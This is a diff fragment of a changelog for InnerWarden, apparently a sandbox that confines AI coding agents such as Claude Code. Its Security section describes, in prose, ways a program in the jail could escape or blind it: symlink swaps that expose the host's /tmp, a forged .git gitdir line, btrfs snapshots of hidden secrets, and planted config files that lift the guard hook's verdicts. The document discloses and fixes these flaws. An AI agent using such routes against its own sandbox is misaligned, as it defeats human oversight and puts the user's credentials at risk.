+  makes it first (0700) and says so. The same holds for each link on the way
+  to a profile's `hide_home` path that sits in a folder the jail may write
+  (`~/.cache/git` a link): it can no longer be removed, renamed or replaced
+  from inside the jail.
+- **On Linux a program in `innerwarden contain` can no longer rename or
+  remove a folder it writes that sits above a place the jail covers.** Each
+  such folder is now a mount point of its own, and `mv` or `rmdir` on it
+  fails with "Device or resource busy": a folder between the project and a
+  nested `--deny-read` path (`packages` and `packages/app` for `--deny-read
+  packages/app/config/.env`), a folder above a profile's read-only path
+  (`proj/third` above an `extra_ro` of `proj/third/lib`) or above a
+  profile's `hide_home` path (`~/.cache/git` above `.cache/git/credential`),
+  a folder above where a hidden dotdir or a `--deny-read` link leads
+  (`~/.config/keys` above a `~/.ssh` that leads to `~/.config/keys/ssh`),
+  and, with `--identity`, `~/.local/state` and `~/.local/state/innerwarden`.
+  The jail still writes in each of them. A tool that renames such a folder
+  has to run outside the jail. A jail started without `--identity`, with the
+  default `--deny-read` paths, no profile and no linked dotdir, has none of
+  these.
+- **On macOS a profile's read-only path (`extra_ro`) is now read-only
+  wherever it is.** Before, the macOS jail never denied writing it, so one
+  in a folder the jail may write (the project, `~/.cache`, `~/.local`,
+  `~/.config`, `/tmp`, `~/.claude.json`) was written as any other file
+  there. A tool that writes at such a path now gets "Operation not
+  permitted": with `extra_ro = ["~/.local/share/claude/versions"]` Claude
+  Code can no longer update itself in the jail, and with `extra_ro =
+  ["~/.claude.json"]` it can no longer save its settings there. Update the
+  tool outside the jail, or take the path out of `extra_ro` if the jail has
+  to write it.
+- **A program in `innerwarden contain` can no longer make a btrfs or bcachefs
+  subvolume or snapshot.** It gets "Operation not permitted". A tool that
+  needs one (a container runtime on btrfs, `btrfs subvolume create`) has to
+  run outside the jail.
+- **On Linux, InnerWarden's own folder kept as a link stops `innerwarden
+  contain`.** Where `~/.config/innerwarden` is a link (a dotfiles manager's),
+  replace the link with the folder it leads to; `innerwarden contain` says
+  how. Such a jail did not start before either.
+- **A hidden dotdir behind a link the jail can change stops `innerwarden
+  contain`.** Where the way to `~/.ssh`, `~/.gnupg` or `~/.aws`, to a link
+  inside one, to InnerWarden's own folder, or (with `--identity` on Linux)
+  to the launcher's records folder goes through a link in a folder the jail
+  writes (`~/.aws` a link to `~/.cache/aws-link`, itself a link;
+  `~/.local/state` a link), replace that link with what it leads to;
+  `innerwarden contain` names it. On Linux, a link inside a hidden dotdir
+  that leads to nothing yet, where the jail shows that place, stops it too:
+  make what it leads to, or remove the link. Such an identified jail with
+  the records folder behind a link did not start before either. So does, on
+  Linux, a profile's `hide_home` path whose way goes through such a link
+  (`~/.cache/git` a link, or a dotfiles manager's `~/.config/gh` link):
+  replace that link with the folder it leads to.
+
+### Security
+
+- **A profile's read-only path never shows where a link a jail can change
+  leads.** `innerwarden contain --identity` took each read-only path of a
+  profile (`extra_ro`) where its links led. A program in an earlier jail
+  that replaced that path, or a folder on the way to it, with a link (it
+  can, in `~/.local`) made the next Linux jail show the place the link led
+  to: a folder of your home the jail hides, or the host's `/tmp` and the
+  sockets in it (a terminal multiplexer's, the display's), a way out of the
+  jail. A link in a folder a jail writes is now followed only to a place the
+  jail shows already, and the real Linux run binds each read-only path, and
+  each folder it pins above one, from a descriptor it opens just before
+  bwrap starts, one folder at a time with no link a program in a jail can
+  change followed: a link put there after the launcher looked is never what
+  the jail shows, and a place that changed so stops the launch. Measured
+  before: a link swapped in while the launcher waited on the project's git
+  files showed the host's `/tmp` in the next identified jail, and `tmux`
+  there ran commands outside it. The launcher no longer waits on a file a
+  program in the jail can write: it read the project's `.git` file and the
+  `commondir` it names with a blocking read, so a FIFO there held it for as
+  long as that program liked.
+- **A program in `innerwarden contain` can no longer have the next jail
+  show a folder of your home writable.** The jail binds a linked worktree's
+  git folders read-write, and took them from the project's `.git` file,
+  which the agent writes: `gitdir: ~/.kube` (or `~/.docker`,
+  `~/.password-store`, another repository, `~/bin`, `~/.bashrc`, or on
+  macOS `~/Library/LaunchAgents`) made the next jail in that project, with
+  or without `--identity`, show that place writable: the agent read and
+  changed what is there, and could run code outside the jail the next time
+  you use it. Git's own files there were no proof either: a project in a
+  folder named `worktrees` whose `.git` named the project itself made the
+  folder two above it (`~/code`, with every repository in it) the
+  repository. A git folder is taken now only where it is a git worktree of
+  this project (see Upgrade notes), every path found with every folder on
+  the way there and no link on it, and where bwrap binds a place from a
+  descriptor the real Linux run binds it from one it opens just before
+  bwrap starts, so a folder on the way swapped for a link since the launcher
+  looked stops the launch. An older bwrap binds it by name, as before; a
+  repository in the project or in a folder every jail writes (`~/.config`,
+  `~/.local`) is not bound at all, since the jail shows it there.
+- **A profile's read-only path never keeps a hidden dotdir from being
+  hidden.** A read-only path at or inside the place `~/.ssh`, `~/.gnupg` or
+  `~/.aws` leads to (a link to another disk) made the jail leave that place
+  as it was: a macOS jail read everything in it, and a Linux jail showed the
+  read-only path there. The place is hidden now, and the read-only path in it
+  left out and said.
+- **On macOS a jail can no longer move a folder above what it hides.** In
+  1.5.5 and earlier, in every macOS jail, a program in it could rename a
+  folder it may write that holds a place the jail denies, and then read that
+  place under the new name, or put a folder of its own in that folder's
+  place, whose files the host's guard read. Every macOS jail now keeps such
+  folders in place, the project and the folder that holds InnerWarden's own
+  folder among them; the jail still writes in them.
+- **On Linux a hidden place inside a project kept in a folder the jail
+  writes stays where the host reads it.** Where such a place sat in a
+  project kept two or more folders down inside a home folder the jail binds,
+  a folder above the project could be renamed, and the host's link then led
+  to a folder the jail made. Each folder the jail writes between such a
+  place and your home is now a mount point of its own.
+- **No jail makes a new btrfs or bcachefs subvolume or snapshot.** In 1.5.5
+  and earlier, on a btrfs or bcachefs disk where the project, or a folder the
+  jail shows, is a subvolume, a program in the jail could snapshot it, and
+  the snapshot held in full the files the jail hides there (`.env`,
+  `secrets/`, each `--deny-read` path): the jail covers those paths with
+  empty mounts, and a snapshot copies what the disk holds under them. On
+  Linux, where the host takes the jail's seccomp filter, every jail now
+  refuses the four btrfs commands and the two bcachefs ones that make a
+  subvolume or a snapshot, on every ABI the filter runs. A snapshot made
+  before the jail started, in a folder the jail shows, still holds those
+  files: only new ones are refused, so keep such snapshots out of the
+  project.
+- **The jail hides InnerWarden's own folder wherever it shows it.** On Linux,
+  where a home folder the jail binds is a link that leads off the home
+  (`~/.cache` on another disk) and `~/.config` is a link into it, the jail
+  covered `~/.config/innerwarden` as named and as it resolves, but showed it
+  a third time through `~/.cache`, with the model key in it. It is covered
+  there too, and so are the launcher's records in an identified jail (where
+  `~/.local` is such a link). A project at that place is refused, as one at
+  `~/.config/innerwarden` is.
+- **The jail hides what it hides wherever a link leads it.** In some home
+  layouts that use symbolic links, a folder the jail hides by default, a
+  `--deny-read` path or InnerWarden's own folder could still be read in the
+  jail. Each is now hidden where it really is, at every place the jail shows
+  it, in every jail; on macOS it is denied where it leads, also outside your
+  home. A link never moves a mask or a deny onto what the jail needs (the
+  guard, the agent's settings or a file in them, such as the one that
+  carries the hook, the project, and for a `--deny-read` path a read-only
+  path of the profile; a hidden dotdir is hidden even there), and a link that a
+  program in the jail can change (a `--deny-read` link in the project) never
+  moves one onto what the jail runs on: on Linux a place outside your home,
+  on macOS a place of the system. Such a place is left as it is, and
+  `innerwarden contain` says so where the jail shows it. A worktree over the
+  place a hidden dotdir leads to, and a read-only path of a profile there,
+  are left out of the jail, and said. In
+  every common layout the jail is the one it was. A link inside one of those
+  dotdirs (`~/.ssh/config` a link into `~/.config/dotfiles`, as GNU stow and
+  chezmoi make one per file where `~/.ssh` is there) is hidden where it
+  leads the same way; the launcher looks for such links as far as 100000
+  entries and 32 folders deep, and says where it stops short.
+- **A jail can no longer move a hidden place away from the name the host
+  reads it by.** A mount moves with the folder it is in, and Linux renames a folder
+  that is not itself a mount point: a program in the jail that renamed the
+  folder above a covered place (`~/.config/keys` above `~/.config/keys/ssh`,
+  where `~/.ssh` leads; `~/dotfiles/ssh` above a stowed `~/.ssh`;
+  `~/.config/app` above where a `--deny-read` link in the project leads; the
+  `~/.local/state` above the launcher's records in an identified jail) took
+  the cover with it and made a folder of its own at the name the host's
+  link, or the launcher, reads. Each folder the jail writes between such a
+  place and your home is now a mount point of its own, and the rename
+  fails. On macOS the sandbox let the jail rename a folder above a denied
+  place, the project included: each such folder the jail may write is now
+  closed to renaming and removal, and the jail still writes in it.
+- **A dotdir, InnerWarden's folder or the launcher's records behind a link
+  the jail can change is refused.** The jail hid where such a way led, but
+  a program in it could replace the link in the folder it writes with a
+  folder of its own, on the host, and the host's `aws`, `ssh` or `gpg` then
+  read its config and ran what it named (`credential_process`, `Match
+  exec`, `pinentry-program`), or the launcher kept its records there. No
+  mount or deny pins a link, so such a launch is refused (see Upgrade
+  notes). On Linux the same holds for a profile's hidden home path: the
+  host's programs read the jail's folder at that name, and wrote into it
+  what the path was hidden for (a credential cache's socket, a token). On
+  macOS the sandbox keeps each link on the way to a profile's hidden home
+  path in place instead, also one further down a chain (`~/.local/a`, for
+  `~/.cache/git` a link to `~/.local/a/git` and `~/.local/a` a link): before,
+  a program in the jail could remove such a link and make a folder of its
+  own there, and the host's git then kept its credential cache in it.
+- **A profile's read-only path stays read-only.** On Linux the read-only
+  bind of an `extra_ro` path inside the project, or a worktree's folder,
+  came before the bind of that folder, which covered it, and on macOS
+  nothing denied writing any `extra_ro` path, so one in a folder the jail
+  may write (the project, `~/.cache`, `~/.local`, `~/.config`, `/tmp`,
+  `~/.claude.json`) was written: a program in the jail wrote it. Each is
+  read-only on both now (see Upgrade notes), and each folder the jail writes
+  above a read-only path is kept in place, so the path is never moved away
+  from its name.
+- **A suppression planted in the jail no longer lifts the hook's verdict.**
+  Inside the jail the hook read the person's suppressions from
+  `~/.config/innerwarden`, which on Linux is an empty folder of the jail's
+  own that its programs can write: a `suppress.toml` written there let
+  through the command it names. The hook in a jail now reads none
+  (`IW_SUPPRESS_CONFIG=/dev/null`); your own file was never visible there.
+- **An LLM or notification config planted in the jail is no longer read.**
+  The jail meant to turn the hook's LLM second opinion and notifications
+  off with `IW_LLM_CONFIG` and `IW_NOTIFY_CONFIG` left empty, but an empty
+  value made the hook read `llm.toml` and `notify.toml` in that same
+  folder: a program in the jail could send each command the hook reviews to
+  an endpoint of its choosing, stall the hook on it, and fire webhooks of
+  its choosing. It could not lift a refusal. Both now read nothing
+  (`/dev/null`).
+- **On Linux, a jail can no longer replace InnerWarden's own folder kept as
+  a link.** The link sits in the `~/.config` the jail binds read-write, and
+  no mount can pin a link: a program in the jail could put a folder of its
+  own in its place, on the host, whose files the host's guard reads. Such a
+  launch is refused (see Upgrade notes).
+
+### Changed
+
+- **On Linux a `--deny-read` path that a link in the project leads out of
+  your home is not hidden there.** Such a link is the agent's to change, and
+  a mask it steers could land on what the jail runs on (a file in `/etc`, a
+  library the hook loads). Where the jail shows that place, `innerwarden
+  contain` says it is not hidden: keep the secret in your home or your
+  project to have it hidden. A path you name outside the project (absolute,
+  or with `..`) with no such link on the way is hidden where it leads, as
+  before. On macOS such a place is denied where it leads, unless it is a
+  place of the system outside the project.
+
+### Fixed
+
+- **The launcher no longer says the API key is hidden where it is not.**
+  Where the place InnerWarden's own folder leads to is left as it is (said
+  before), the launch line said the folder, the API key with it, was not
+  visible in the jail. It now says the place its link leads to is not
+  hidden.
+- **The first jail on an account where Claude Code never ran has the guard's
+  hook.** Arming the hook makes `~/.claude`, and the jail was planned before
+  that, without it: on Linux the first `innerwarden contain` there showed no
+  `~/.claude/settings.json`, so the hook never fired inside, while the
+  launcher said it was armed. The jail is planned again once the hook is
+  armed. A dry run arms nothing, so on such an account it still shows a jail
+  without `~/.claude`.
+- **Claude Code keeps its settings in an identified jail.** In
+  `innerwarden contain --identity` on Linux the jail's home is an empty
+  folder of its own, so Claude Code's settings file, `~/.claude.json`, was
+  gone at every launch: from the second launch on Claude Code said twice that
+  the file was missing, and what it saved there (an MCP server you added, its
+  first-run answers) was lost. In the jail that file now leads to
+  `~/.claude/.claude.json`, in the folder the jail already shares, so it is
+  kept between launches. Your own `~/.claude.json` is not shown in the jail
+  and its Claude Code never uses it, and the copies Claude Code keeps of it in
+  `~/.claude/backups` are not shown either: each identified jail has an empty
+  `~/.claude/backups` of its own. Where your own `~/.claude.json` is a link,
+  or a hard link, to a file in `~/.claude`, that file is shared with the jail
+  like the rest of the folder, and where `~/.claude/backups` is a link of
+  yours the jail shows the host's copies (`innerwarden contain` says so). Not
+  where a hidden home path or a read-only path of the profile covers that
+  place or names `~/.claude.json`, where it is a link of yours or anything
+  other than a file, or where your own `~/.claude.json` is that file or leads
+  into `~/.claude` or to nothing: Claude Code then keeps its file in the
+  jail's own home, as before. Every jail shares `~/.claude`, so what a
+  program in any jail writes to `~/.claude/.claude.json` is what the next
+  identified Claude Code loads, as with `~/.claude/settings.json`: an MCP
+  server listed there starts with it.
+- **Two identified jails at once no longer share Claude Code's session
+  file.** Claude Code is process 2 in every jail and lists each running
+  session as `~/.claude/sessions/<pid>.json`, in the `~/.claude` the jails
+  share, so two jails at once wrote and read the same `2.json`. Each
+  identified jail now has its own empty `~/.claude/sessions` (the launcher
+  makes the folder, 0700, where it is not there), at every place the jail
+  shows it, and none sees the sessions running outside it. Only for Claude
+  Code's folder at `~/.claude`, where it is unless `CLAUDE_CONFIG_DIR` names
+  another; where the jail cannot have the folder of its own (a link is there,
+  the project is inside it), `innerwarden contain` says so. A jail started
+  without `--identity` is unchanged: there Claude Code's settings file is
+  still gone at every launch, and its session list is still shared.
+
 ## 1.5.5 - 2026-10-11
 
 ### Upgrade notes: what to do
